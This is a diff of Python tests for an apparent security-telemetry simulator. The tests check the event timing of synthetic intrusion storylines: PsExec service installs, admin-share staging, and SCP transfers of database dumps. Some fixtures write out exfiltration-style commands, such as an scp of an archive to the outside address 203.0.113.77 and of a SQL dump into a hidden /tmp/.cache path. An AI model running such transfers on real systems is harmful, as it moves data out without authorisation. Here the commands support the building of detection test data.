-        assert generator.process_source_create_time(system.hostname, event.process.pid) == max(
-            source_times.values()
-        )
+        source_bound = generator.process_source_create_bound(system, event.process.pid)
+        assert source_bound is not None
+        assert source_bound >= max(source_times.values())
 
     def test_process_owned_windows_connection_waits_for_visible_process_create(self):
         captured: list[Any] = []
 
-        class _CapturingDispatcher:
-            visibility_engine = None
-
-            @staticmethod
-            def dispatch(event: Any) -> None:
-                captured.append(event)
-
-            @staticmethod
-            def record_filtered_network_observation() -> None:
-                return None
-
         state_manager = StateManager()
-        generator = ActivityGenerator(state_manager, {})
-        generator.dispatcher = _CapturingDispatcher()
+        generator = _activity_generator_with_captured_builders(state_manager, captured.append)
         actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
         source = System(
             hostname="SRC",
@@ -879,7 +1667,7 @@ class TestStorylineCommandNetworks:
             "mstsc.exe /v:DC-01",
             parent_pid=4,
         )
-        visible_process_time = generator.process_source_create_time(source.hostname, pid)
+        visible_process_time = generator.process_source_create_bound(source, pid)
         assert visible_process_time is not None
 
         generator.generate_connection(
@@ -955,7 +1743,9 @@ class TestLastStorylineProcessOsRepairHeuristic:
 class _FakeActivityGenerator:
     def __init__(self) -> None:
         self.reserved_ports: list[int] = []
+        self.previewed_ports: list[int] = []
         self.connections: list[dict] = []
+        self.smb_activities: list[dict[str, Any]] = []
         self.ssh_sessions: list[dict] = []
         self.explicit_credentials: list[dict] = []
         self.processes: list[dict] = []
@@ -964,6 +1754,8 @@ class _FakeActivityGenerator:
         self.process_source_termination_times: dict[tuple[str, int], datetime] = {}
         self.ssh_ready_times: dict[tuple[str, int, str], datetime] = {}
         self.process_source_termination_offset: timedelta | None = None
+        self.foreground_process_termination_offset: timedelta | None = None
+        self.foreground_process_termination_times: dict[tuple[str, int], datetime] = {}
         self.service_installs: list[dict] = []
         self.dhcp_leases: list[dict] = []
         self.syslog_events: list[dict] = []
@@ -1003,6 +1795,24 @@ class _FakeActivityGenerator:
         dwell = timedelta(seconds=6 if command in {"pwd", "id", "hostname -f"} else 12)
         self._bash_next_time[(system.hostname, actor.username)] = scheduled_time + dwell
         return scheduled_time
+
+    def _prepare_bash_history_command(self, _system: System, command: str) -> str:
+        return command
+
+    def _emit_bash_command_event(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+        command: str,
+    ) -> None:
+        self.bash_commands.append(
+            {
+                "args": (actor, system, time, command),
+                "kwargs": {},
+                "scheduled_time": time,
+            }
+        )
 
     def reserve_linux_foreground_process_start(self, **kwargs: Any) -> datetime:
         system = kwargs["system"]
@@ -1051,7 +1861,20 @@ class _FakeActivityGenerator:
     def generate_process(self, *args: Any, **kwargs: Any) -> int:
         self._next_pid += 1
         self.processes.append(kwargs)
+        system = kwargs.get("system")
+        process_time = kwargs.get("time")
+        if (
+            system is not None
+            and isinstance(process_time, datetime)
+            and self.foreground_process_termination_offset is not None
+        ):
+            self.foreground_process_termination_times[(system.hostname, self._next_pid)] = (
+                process_time + self.foreground_process_termination_offset
+            )
         return self._next_pid
+
+    def foreground_process_termination_time(self, hostname: str, pid: int) -> datetime | None:
+        return self.foreground_process_termination_times.get((hostname, pid))
 
     def generate_process_termination(self, *args: Any, **kwargs: Any) -> None:
         self.process_terminations.append(kwargs)
@@ -1078,6 +1901,12 @@ class _FakeActivityGenerator:
         self.reserved_ports.append(45678)
         return 45678
 
+    def preview_ssh_source_port(self, *args: Any, **kwargs: Any) -> int:
+        """Capture the allocation-free SSH port selection used by storyline SCP."""
+
+        self.previewed_ports.append(45678)
+        return 45678
+
     def generate_connection(self, **kwargs: Any) -> str:
         src_port = kwargs.get("src_port") or 50000 + len(self.connections)
         self._last_connection_effective_tuple = (
@@ -1089,6 +1918,30 @@ class _FakeActivityGenerator:
         )
         self.connections.append(kwargs)
         return "Cscptransfer00001"
+
+    def generate_smb_activity(self, **kwargs: Any) -> SimpleNamespace:
+        """Capture the canonical SMB transport requested by staged-archive tests."""
+
+        self.smb_activities.append(kwargs)
+        spec = kwargs["spec"]
+        files = kwargs.get("files_override") or ()
+        share = self._storage_world.share(spec.source.share)
+        target = self._storage_systems[share.system.casefold()]
+        total_bytes = sum(file.size_bytes for file in files)
+        uid = self.generate_connection(
+            src_ip=kwargs["parent_system"].ip,
+            dst_ip=target.ip,
+            time=kwargs["time"],
+            dst_port=445,
+            proto="tcp",
+            service="smb",
+            duration=max(3.0, total_bytes / 25_000_000),
+            orig_bytes=1_200,
+            resp_bytes=total_bytes,
+            pid=kwargs.get("process_pid", -1),
+            process_image=kwargs.get("process_image"),
+        )
+        return SimpleNamespace(transport_uids=(uid,), operations=())
 
     def _last_effective_connection_source_port(
         self,
@@ -1125,6 +1978,11 @@ class _FakeActivityGenerator:
 
     def process_source_create_time(self, hostname: str, pid: int) -> datetime | None:
         return self.process_source_times.get((hostname, pid))
+
+    def process_source_create_bound(self, system: System, pid: int) -> datetime | None:
+        """Return the fake's frozen canonical source bound for storyline ordering."""
+
+        return self.process_source_times.get((system.hostname, pid))
 
     def process_source_terminate_time(self, hostname: str, pid: int) -> datetime | None:
         return self.process_source_termination_times.get((hostname, pid))
@@ -1210,7 +2068,11 @@ class _FakeStateManager:
         return self.sessions.get(logon_id)
 
     def get_processes_on_system(self, hostname: str) -> list[SimpleNamespace]:
-        return []
+        return [
+            process
+            for (process_hostname, _pid), process in self.processes.items()
+            if process_hostname == hostname
+        ]
 
     def get_process(self, hostname: str, pid: int) -> SimpleNamespace | None:
         return self.processes.get((hostname, pid))
@@ -1221,8 +2083,64 @@ class _FakeStateManager:
     def get_process_object_id(self, hostname: str, pid: int) -> str:
         return f"{hostname}:{pid}"
 
+    def get_process_identity(self, hostname: str, pid: int) -> ProcessIdentity:
+        process = self.get_process(hostname, pid)
+        return ProcessIdentity(
+            hostname=hostname,
+            object_id=self.get_process_object_id(hostname, pid),
+            pid=pid,
+            parent_pid=int(getattr(process, "parent_pid", 0)),
+            image=str(getattr(process, "image", "process")),
+            command_line=str(getattr(process, "command_line", "")),
+            principal=str(getattr(process, "username", "")),
+            logon_id=str(getattr(process, "logon_id", "")),
+            started_at=getattr(process, "start_time", datetime(2020, 1, 1, tzinfo=UTC)),
+            lifecycle_group_id=f"{hostname}:{pid}:lifecycle",
+        )
+
     def mark_story_process(self, hostname: str, pid: int) -> None:
         return None
+
+
+def _attach_fake_admin_storage(generator: _FakeActivityGenerator, server: System) -> None:
+    """Give a focused storyline fake the canonical sparse C$ topology."""
+
+    access = CompiledStorageAccess(
+        read=frozenset({"Domain Admins"}),
+        modify=frozenset({"Domain Admins"}),
+        admin=frozenset({"Domain Admins"}),
+        deny=frozenset(),
+    )
+    generator._storage_world = StorageWorldModel(
+        volumes=(
+            CompiledStorageVolume(
+                id="system",
+                system=server.hostname,
+                mount="C:\\",
+                filesystem="ntfs",
+                label="System",
+            ),
+        ),
+        shares=(
+            CompiledStorageShare(
+                ref=f"{server.hostname}.c_admin",
+                system=server.hostname,
+                name="C$",
+                volume="system",
+                root="",
+                preset="collaboration",
+                population="small",
+                activity="low",
+                encryption="not_required",
+                smb_native_filesystem="NTFS",
+                audit="standard",
+                access=access,
+                files=(),
+            ),
+        ),
+        mappings=(),
+    )
+    generator._storage_systems = {server.hostname.casefold(): server}
 
 
 class TestFileTransferActionBundles:
@@ -1277,6 +2195,23 @@ class TestFileTransferActionBundles:
         assert result.file_transfer.duration > 1.0
         assert result.file_transfer.duration < request.parent_duration
         assert result.file_transfer.seen_bytes == request.response_body_len
+
+    def test_tiny_generic_http_response_does_not_invent_pe_analysis(self):
+        """Ambiguous small bodies keep file evidence without speculative PE metadata."""
+
+        request = HttpResponseFileTransferRequest(
+            host="api.example.test",
+            uri="/result",
+            dst_ip="93.184.216.34",
+            response_body_len=4096,
+            response_mime_types=["application/octet-stream"],
+            timestamp=datetime(2026, 5, 18, 12, 0, tzinfo=UTC),
+        )
+
+        result = HttpResponseFileTransferActionBundle(request, random.Random(4)).execute()
+
+        assert result.file_transfer.total_bytes == 4096
+        assert result.pe is None
 
     def test_http_file_transfer_hashes_follow_static_object_identity(self):
         """Identical HTTP response objects should not get new hashes per FUID."""
@@ -1378,45 +2313,6 @@ class TestFileTransferActionBundles:
         assert result.file_transfer.sha1
         assert result.pe is not None
 
-    def test_smb_file_transfer_metadata_bundle_preserves_direction(self):
-        """SMB files.log metadata should preserve caller-owned transfer direction."""
-        request = SmbFileTransferMetadataRequest(
-            src_ip="10.10.1.35",
-            dst_ip="10.10.2.20",
-            transfer_bytes=65_536,
-            duration=4.2,
-            server="FILE-SRV-01",
-            user="aisha.johnson",
-            is_orig=True,
-        )
-        smb_config = {
-            "min_transfer_bytes": 1024,
-            "mime_types": [{"mime_type": "application/pdf", "weight": 1}],
-            "analyzer_sets": [{"analyzers": ["MD5"], "weight": 1}],
-            "filename_templates": [
-                {
-                    "mime_types": ["application/pdf"],
-                    "templates": [r"\\{server}\Projects\{basename}.pdf"],
-                    "weight": 1,
-                }
-            ],
-            "missing_bytes_probability": 0.0,
-            "timeout_probability": 0.0,
-        }
-
-        context = SmbFileTransferMetadataActionBundle(
-            request,
-            random.Random(8),
-            smb_config=smb_config,
-        ).execute()
-
-        assert context is not None
-        assert context.source == "SMB"
-        assert context.is_orig is True
-        assert context.total_bytes == 65_536
-        assert context.md5
-        assert context.filename.startswith(r"\\FILE-SRV-01\Projects")
-
     def test_staged_archive_smb_read_bundle_anchor_is_stable(self):
         """Identical staged-archive transfer requests should have stable anchors."""
         source = System(hostname="SRC", ip="10.10.1.35", os="Windows 11", type="workstation")
@@ -1504,8 +2400,11 @@ class TestFileTransferActionBundles:
         source = System(hostname="DB-PROD-01", ip="10.0.0.10", os="Ubuntu 22.04", type="server")
         target = System(hostname="APP-INT-01", ip="10.0.0.20", os="Ubuntu 22.04", type="server")
         actor = User(username="root", full_name="Root", email="root@example.local")
-        activity = ActivityGenerator(state, {})
-        activity.dispatcher = SimpleNamespace(dispatch=lambda event: None)
+        activity = ActivityGenerator(
+            state,
+            {},
+            dispatcher=EventDispatcher(state_manager=state, emitters={}),
+        )
         state.set_current_time(timestamp)
         source_pid = state.create_process(
             source.hostname,
@@ -1516,10 +2415,23 @@ class TestFileTransferActionBundles:
             "High",
         )
         source_object_id = state.get_process_object_id(source.hostname, source_pid)
+        activity.ensure_linux_ssh_responder_process(
+            target_system=target,
+            time=timestamp + timedelta(seconds=1),
+            source_ip=source.ip,
+            source_port=49152,
+            target_user="root",
+        )
+        activity._remember_ssh_session_ready_time(
+            source.ip,
+            49152,
+            target.ip,
+            timestamp + timedelta(seconds=1, milliseconds=100),
+        )
         dispatched: list[Any] = []
         executor = SimpleNamespace(
             activity_generator=activity,
-            dispatcher=SimpleNamespace(dispatch=dispatched.append),
+            dispatcher=_CapturingDispatcherProxy(activity.dispatcher, dispatched.append),
             state_manager=state,
         )
 
@@ -1537,6 +2449,7 @@ class TestFileTransferActionBundles:
                 target_path="/tmp/rpt.sql.gz",
                 transfer_time=timestamp + timedelta(seconds=1),
                 source_port=49152,
+                transfer_completed_at=timestamp + timedelta(seconds=31),
             ),
             random.Random(11),
         ).execute()
@@ -1548,11 +2461,13 @@ class TestFileTransferActionBundles:
         assert source_read.file.path == "/tmp/rpt.sql.gz"
         assert source_read.file.action == "read"
         assert source_read.process.pid == source_pid
-        assert source_read.edr.actor_id == source_object_id
+        assert source_read.identity_plan.actor_id == source_object_id
         assert receiver_create.src_host.hostname == target.hostname
         assert receiver_create.file.path == "/tmp/rpt.sql.gz"
         assert receiver_create.file.action == "create"
         assert source_read.timestamp < receiver_create.timestamp
+        assert timestamp + timedelta(seconds=30) < receiver_create.timestamp
+        assert receiver_create.timestamp < timestamp + timedelta(seconds=31)
 
 
 class TestStorylineScpCorrelation:
@@ -1577,7 +2492,7 @@ class TestStorylineScpCorrelation:
         dispatched: list[Any] = []
         engine.dispatcher = SimpleNamespace(
             visibility_engine=None,
-            dispatch=dispatched.append,
+            dispatch_builder=dispatched.append,
         )
         event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
         visible_process_time = event_time + timedelta(seconds=4)
@@ -1632,11 +2547,21 @@ class TestStorylineScpCorrelation:
         )
         engine.state_manager = _FakeStateManager()
         engine.activity_generator = _FakeActivityGenerator()
+        source_content = FileContentIdentity(
+            file_object_id="file-source-archive",
+            version=1,
+            size_bytes=794_475,
+            mime_type="application/gzip",
+            seed_ref="archive-seed",
+        )
+        engine.activity_generator._runtime_content_manager = SimpleNamespace(
+            resolve_record=lambda *_args: SimpleNamespace(content=source_content)
+        )
         engine.dispatcher = SimpleNamespace(visibility_engine=None)
-        receiver_ports: list[int] = []
+        receiver_requests: list[dict[str, Any]] = []
 
         def capture_receiver_artifacts(**kwargs) -> None:
-            receiver_ports.append(kwargs["source_port"])
+            receiver_requests.append(kwargs)
 
         engine._emit_scp_receiver_artifacts = capture_receiver_artifacts
         spec = SimpleNamespace(
@@ -1654,11 +2579,60 @@ class TestStorylineScpCorrelation:
             explicit_types={"process"},
         )
 
-        assert engine.activity_generator.reserved_ports == [45678]
+        assert engine.activity_generator.reserved_ports == []
+        assert engine.activity_generator.previewed_ports == [45678]
         assert engine.activity_generator.connections == []
         assert engine.activity_generator.ssh_sessions[0]["source_port"] == 45678
         assert engine.activity_generator.ssh_sessions[0]["source"] == "storyline_scp"
-        assert receiver_ports == [45678]
+        assert engine.activity_generator.ssh_sessions[0]["defer_session_close"] is True
+        assert engine.activity_generator.ssh_sessions[0]["orig_bytes"] > source_content.size_bytes
+        assert receiver_requests[0]["source_port"] == 45678
+        assert receiver_requests[0]["source_content"] == source_content
+        assert receiver_requests[0]["transfer_completed_at"] == (
+            engine.activity_generator.ssh_sessions[0]["time"]
+            + timedelta(seconds=engine.activity_generator.ssh_sessions[0]["duration"])
+        )
+
+    def test_unmodeled_scp_target_preserves_compatibility_port_reservation(self):
+        """Only modeled Linux SSH delegation uses allocation-free tuple preview."""
+
+        source = System(
+            hostname="SRC",
+            ip="10.10.0.10",
+            os="Ubuntu 22.04",
+            type="workstation",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        spec = SimpleNamespace(
+            type="process",
+            process_name="scp",
+            command_line=("scp /tmp/archive.tar.gz root@203.0.113.77:/var/tmp/archive.tar.gz"),
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            activity="copy archive to an unmodeled host",
+            explicit_types={"process"},
+        )
+
+        assert engine.activity_generator.reserved_ports == [45678]
+        assert engine.activity_generator.previewed_ports == []
+        assert engine.activity_generator.connections[0]["src_port"] == 45678
+        assert engine.activity_generator.ssh_sessions == []
 
     def test_scp_network_and_receiver_artifacts_wait_for_visible_source_process_create(self):
         source = System(
@@ -1977,6 +2951,7 @@ class TestStorylineCommandSideEffects:
             source_ip=source.ip,
         )
         engine.activity_generator = _FakeActivityGenerator()
+        _attach_fake_admin_storage(engine.activity_generator, file_server)
         engine.activity_generator._ip_to_system = {
             source.ip: source,
             file_server.ip: file_server,
@@ -1984,7 +2959,7 @@ class TestStorylineCommandSideEffects:
         dispatched: list[Any] = []
         engine.dispatcher = SimpleNamespace(
             visibility_engine=None,
-            dispatch=dispatched.append,
+            dispatch_builder=dispatched.append,
         )
         smb_logons: list[dict[str, Any]] = []
 
@@ -2114,22 +3089,17 @@ class TestStorylineCommandSideEffects:
             "Chrome/121.0.0.0 Safari/537.36"
         )
 
-        file_transfer = smb_transfer["file_transfer"]
-        assert isinstance(file_transfer, FileTransferContext)
-        assert file_transfer.source == "SMB"
-        assert file_transfer.is_orig is False
-        assert file_transfer.total_bytes == smb_transfer["resp_bytes"]
-        assert file_transfer.filename == (r"\\FILE-SRV-01\C$\ProgramData\Microsoft\cache_7f3a.zip")
-        assert smb_logons == [
-            {
-                "actor": actor.username,
-                "dst": file_server.hostname,
-                "emit_network_evidence": False,
-                "source_port": 50000,
-                "src_ip": source.ip,
-            }
-        ]
-        assert engine.activity_generator.process_terminations[0]["pid"] == smb_transfer["pid"]
+        smb_activity = engine.activity_generator.smb_activities[0]
+        transferred = smb_activity["files_override"][0]
+        assert transferred.size_bytes == smb_transfer["resp_bytes"]
+        assert transferred.path == r"ProgramData\Microsoft\cache_7f3a.zip"
+        assert smb_activity["spec"].operation == "copy"
+        assert smb_activity["spec"].source.share == "FILE-SRV-01.c_admin"
+        assert smb_logons == []
+        assert any(
+            termination["pid"] == smb_transfer["pid"]
+            for termination in engine.activity_generator.process_terminations
+        )
 
     def test_compress_archive_exfil_handoff_uses_upload_host_source_read(self):
         staging_source = System(
@@ -2170,6 +3140,7 @@ class TestStorylineCommandSideEffects:
         )
         engine.state_manager = _FakeStateManager()
         engine.activity_generator = _FakeActivityGenerator()
+        _attach_fake_admin_storage(engine.activity_generator, file_server)
         engine.activity_generator._ip_to_system = {
             staging_source.ip: staging_source,
             upload_source.ip: upload_source,
@@ -2178,7 +3149,7 @@ class TestStorylineCommandSideEffects:
         dispatched: list[Any] = []
         engine.dispatcher = SimpleNamespace(
             visibility_engine=None,
-            dispatch=dispatched.append,
+            dispatch_builder=dispatched.append,
         )
         smb_logons: list[dict[str, Any]] = []
 
@@ -2281,15 +3252,10 @@ class TestStorylineCommandSideEffects:
         assert source_file_create.timestamp < source_file_read.timestamp
         assert "Chrome/" in upload["http"].user_agent
         assert "Firefox/" not in upload["http"].user_agent
-        assert smb_logons == [
-            {
-                "actor": upload_actor.username,
-                "dst": file_server.hostname,
-                "emit_network_evidence": False,
-                "source_port": 50000,
-                "src_ip": upload_source.ip,
-            }
-        ]
+        smb_activity = engine.activity_generator.smb_activities[0]
+        assert smb_activity["actor"].username == upload_actor.username
+        assert smb_activity["spec"].source.share == "FILE-SRV-01.c_admin"
+        assert smb_logons == []
 
     def test_scp_receiver_file_artifacts_leave_ssh_syslog_to_bundle(self):
         source = System(
@@ -2314,7 +3280,7 @@ class TestStorylineCommandSideEffects:
         engine.activity_generator = _FakeActivityGenerator()
         file_events: list[Any] = []
         engine.dispatcher = SimpleNamespace(
-            dispatch=lambda event: (
+            dispatch_builder=lambda event: (
                 file_events.append(event) if event.event_type == "file_create" else None
             )
         )
@@ -2339,6 +3305,63 @@ class TestStorylineCommandSideEffects:
         assert file_events
         assert file_events[0].event_type == "file_create"
 
+    def test_scp_receiver_file_delays_following_smb_upload_until_file_exists(self):
+        """A local SMB source cannot be consumed before SCP creates the receiver path."""
+
+        source = System(
+            hostname="DB-PROD-01",
+            ip="10.10.2.31",
+            os="Ubuntu 22.04",
+            type="server",
+        )
+        target = System(
+            hostname="APP-INT-01",
+            ip="10.10.2.30",
+            os="Ubuntu 22.04",
+            type="server",
+        )
+        actor = User(
+            username="root",
+            full_name="Root",
+            email="root@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(dispatch_builder=lambda event: None)
+        transfer_time = datetime(2024, 3, 18, 17, 21, 23, tzinfo=UTC)
+
+        available_at = engine._emit_scp_receiver_artifacts(
+            source_system=source,
+            target_system=target,
+            actor=actor,
+            source_pid=4242,
+            source_process="/usr/bin/scp",
+            source_command=("scp /tmp/rpt.sql.gz root@APP-INT-01:/tmp/.cache/rpt.sql.gz"),
+            source_path="/tmp/rpt.sql.gz",
+            target_user="root",
+            target_path="/tmp/.cache/rpt.sql.gz",
+            transfer_time=transfer_time,
+            source_port=40117,
+            rng=random.Random(7),
+        )
+
+        assert available_at is not None
+        smb_spec = SmbActivityEventSpec(
+            operation="copy",
+            source={"type": "client", "path": "/tmp/.cache/rpt.sql.gz"},
+            destination={"type": "share", "share": "FILE-LNX-01.research"},
+        )
+        requested_at = transfer_time - timedelta(minutes=2)
+        ready_at = engine._storyline_smb_file_ready_time(
+            system=target,
+            spec=smb_spec,
+            requested_at=requested_at,
+            rng=random.Random(9),
+        )
+
+        assert ready_at > available_at
+
     def test_scp_receiver_file_waits_for_visible_source_process_create(self):
         source = System(
             hostname="SRC",
@@ -2362,7 +3385,7 @@ class TestStorylineCommandSideEffects:
         engine.activity_generator = _FakeActivityGenerator()
         file_events: list[Any] = []
         engine.dispatcher = SimpleNamespace(
-            dispatch=lambda event: (
+            dispatch_builder=lambda event: (
                 file_events.append(event) if event.event_type == "file_create" else None
             )
         )
@@ -2413,7 +3436,7 @@ class TestStorylineCommandSideEffects:
         engine.activity_generator = _FakeActivityGenerator()
         file_events: list[Any] = []
         engine.dispatcher = SimpleNamespace(
-            dispatch=lambda event: (
+            dispatch_builder=lambda event: (
                 file_events.append(event) if event.event_type == "file_create" else None
             )
         )
@@ -2439,7 +3462,7 @@ class TestStorylineCommandSideEffects:
         assert file_events
         assert file_events[0].timestamp > ready_time
 
-    def test_linux_process_uses_scheduled_bash_history_time(self):
+    def test_linux_storyline_process_uses_authored_anchor_for_bash_history(self):
         source = System(
             hostname="SRC",
             ip="10.10.0.10",
@@ -2457,7 +3480,6 @@ class TestStorylineCommandSideEffects:
         )
         engine.state_manager = _FakeStateManager()
         engine.activity_generator = _FakeActivityGenerator()
-        engine.activity_generator.bash_schedule_offset = timedelta(seconds=45)
         engine.dispatcher = SimpleNamespace(visibility_engine=None)
         requested_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
         spec = SimpleNamespace(
@@ -2475,11 +3497,10 @@ class TestStorylineCommandSideEffects:
             explicit_types={"process"},
         )
 
-        scheduled_time = requested_time + timedelta(seconds=45)
-        assert engine.activity_generator.bash_commands[0]["scheduled_time"] == scheduled_time
-        assert engine.activity_generator.processes[0]["time"] == scheduled_time
+        assert engine.activity_generator.bash_commands[0]["scheduled_time"] == requested_time
+        assert engine.activity_generator.processes[0]["time"] == requested_time
 
-    def test_linux_storyline_foreground_chain_waits_for_prior_termination(self):
+    def test_linux_storyline_foreground_chain_ignores_source_observation_delay(self):
         source = System(
             hostname="DB-PROD-01",
             ip="10.10.2.40",
@@ -2503,8 +3524,11 @@ class TestStorylineCommandSideEffects:
         )
         engine.state_manager = _FakeStateManager()
         engine.activity_generator = _FakeActivityGenerator()
-        engine.activity_generator.process_source_termination_offset = timedelta(seconds=20)
-        engine.dispatcher = SimpleNamespace(visibility_engine=None, dispatch=lambda event: None)
+        engine.activity_generator.process_source_termination_offset = timedelta(hours=1)
+        engine.dispatcher = SimpleNamespace(
+            visibility_engine=None,
+            dispatch_builder=lambda event: None,
+        )
         engine.malicious_events = []
         start_time = datetime(2026, 5, 11, 17, 15, tzinfo=UTC)
         specs = [
@@ -2554,10 +3578,11 @@ class TestStorylineCommandSideEffects:
             command for command, _scheduled in bash_entries if command not in main_commands
         ]
         assert main_bash_times == process_times
-        assert len(prep_commands) >= 6
+        # Preparation for the first command is retained. Later optional probes are
+        # omitted when the serialized shell leaves no idle window before the next
+        # authored process; they must not be backfilled across a running command.
+        assert len(prep_commands) >= 4
         assert any("SHOW TABLES FROM ehr" in command for command in prep_commands)
-        assert any("/tmp/rpt_0318.sql" in command for command in prep_commands)
-        assert any("/tmp/rpt_0318.sql.gz" in command for command in prep_commands)
         assert process_times == sorted(process_times)
         assert process_times[1] > process_times[0] + timedelta(seconds=5)
         assert process_times[2] > process_times[1] + timedelta(seconds=5)
@@ -2567,7 +3592,8 @@ class TestStorylineCommandSideEffects:
         source_termination_times = engine.activity_generator.process_source_termination_times
         assert termination_times[0] < process_times[1]
         assert termination_times[1] < process_times[2]
-        assert source_termination_times[(source.hostname, 4243)] < process_times[2]
+        assert process_times[1] < source_termination_times[(source.hostname, 4243)]
+        assert process_times[2] < source_termination_times[(source.hostname, 4244)]
         assert engine.activity_generator.ssh_sessions
         assert engine.activity_generator.ssh_sessions[0]["time"] > process_times[2]
 
@@ -2625,7 +3651,10 @@ class TestStorylineCommandSideEffects:
         )
         engine.state_manager = _FakeStateManager()
         engine.activity_generator = _FakeActivityGenerator()
-        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        engine.dispatcher = SimpleNamespace(
+            visibility_engine=None,
+            storyline_cluster_id="remote-service-cluster",
+        )
         spec = SimpleNamespace(
             type="process",
             process_name=r"C:\Windows\System32\PSEXESVC.exe",
@@ -2642,6 +3671,126 @@ class TestStorylineCommandSideEffects:
         )
 
         assert engine.activity_generator.processes[0]["ensure_file_event"] is False
+        assert engine.activity_generator.processes[0]["lifecycle_group_id"] == (
+            engine._storyline_remote_service_lifecycle_id(source, "PSEXESVC")
+        )
+
+    def test_same_cluster_service_process_and_install_share_lifecycle(self):
+        """Authored PsExec phases should use one observation-coherent action owner."""
+        source = System(
+            hostname="DC-01",
+            ip="10.10.0.10",
+            os="Windows Server 2022",
+            type="domain_controller",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(
+            visibility_engine=None,
+            storyline_cluster_id="remote-service-cluster",
+        )
+        process_spec = SimpleNamespace(
+            type="process",
+            process_name=r"C:\Windows\PSEXESVC.exe",
+            command_line=r"C:\Windows\PSEXESVC.exe",
+        )
+        service_spec = SimpleNamespace(
+            type="service_installed",
+            service_name="PSEXESVC",
+            service_file_name=r"%SystemRoot%\PSEXESVC.exe",
+            service_account="LocalSystem",
+        )
+        base_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+
+        engine._execute_typed_event(
+            spec=service_spec,
+            actor=actor,
+            system=source,
+            time=base_time,
+            activity="install remote service",
+            explicit_types={"process", "service_installed"},
+        )
+        engine._execute_typed_event(
+            spec=process_spec,
+            actor=actor,
+            system=source,
+            time=base_time + timedelta(seconds=1),
+            activity="run remote service",
+            explicit_types={"process", "service_installed"},
+        )
+
+        process_group = engine.activity_generator.processes[0]["lifecycle_group_id"]
+        service_group = engine.activity_generator.service_installs[0]["lifecycle_group_id"]
+        assert process_group == service_group
+        assert (
+            engine._last_storyline_service_by_system[source.hostname]["lifecycle_group_id"]
+            == service_group
+        )
+
+    def test_installed_local_system_service_process_uses_service_identity(self):
+        """An SCM child uses the configured token rather than the remote installer."""
+        source = System(
+            hostname="DC-02",
+            ip="10.10.0.11",
+            os="Windows Server 2022",
+            type="domain_controller",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(
+            visibility_engine=None,
+            storyline_cluster_id="directory-cache-cluster",
+        )
+        service_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        engine._record_storyline_service_install(
+            system=source,
+            service_name="DirectoryCacheSvc",
+            service_file_name=r"C:\Windows\System32\DirectoryCacheSvc.exe",
+            service_account="LocalSystem",
+            time=service_time,
+        )
+        spec = SimpleNamespace(
+            type="process",
+            process_name=r"C:\Windows\System32\DirectoryCacheSvc.exe",
+            command_line=r"C:\Windows\System32\DirectoryCacheSvc.exe --service",
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=service_time + timedelta(seconds=2),
+            activity="start remote service",
+            explicit_types={"process", "service_installed"},
+        )
+
+        process = engine.activity_generator.processes[0]
+        assert process["user"].username == "SYSTEM"
+        assert process["logon_id"] == "0x3e7"
+        assert process["parent_pid"] == 500
+        assert process["ensure_file_event"] is False
+        assert (
+            process["lifecycle_group_id"]
+            == (engine._last_storyline_service_by_system[source.hostname]["lifecycle_group_id"])
+        )
 
     def test_service_installed_reuses_sc_create_start_type(self):
         source = System(
@@ -3163,6 +4312,72 @@ class TestStorylineCommandSideEffects:
             == source.ip
         )
 
+    def test_type10_logon_compatibility_records_rdp_session_readiness(self):
+        """Legacy Type 10 authored logons delay later activity until RDP is usable."""
+
+        target = System(
+            hostname="WS-AJOHNSON-01",
+            ip="10.10.1.35",
+            os="Windows 11 Enterprise",
+            type="workstation",
+        )
+        actor = User(
+            username="aisha.johnson",
+            full_name="Aisha Johnson",
+            email="aisha.johnson@example.local",
+        )
+        session_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        ready_time = session_time + timedelta(seconds=3)
+        state_manager = _FakeStateManager()
+        generator = _FakeActivityGenerator()
+
+        def generate_rdp_logon(**kwargs: Any) -> str:
+            state_manager.sessions["0xrdp"] = SimpleNamespace(
+                username=actor.username,
+                system=target.hostname,
+                logon_id="0xrdp",
+                logon_type=10,
+                source_ip=kwargs["source_ip"],
+                start_time=session_time,
+                source_ready_time=ready_time,
+                network_close_time=session_time + timedelta(minutes=30),
+                session_kind="rdp",
+            )
+            return "0xrdp"
+
+        generator.generate_logon = generate_rdp_logon
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[target], service_accounts=[])
+        )
+        engine.state_manager = state_manager
+        engine.activity_generator = generator
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        engine._session_end_plan_for_current_start = lambda: None
+        engine._authored_rdp_session_end_plan = lambda: None
+        spec = SimpleNamespace(
+            type="logon",
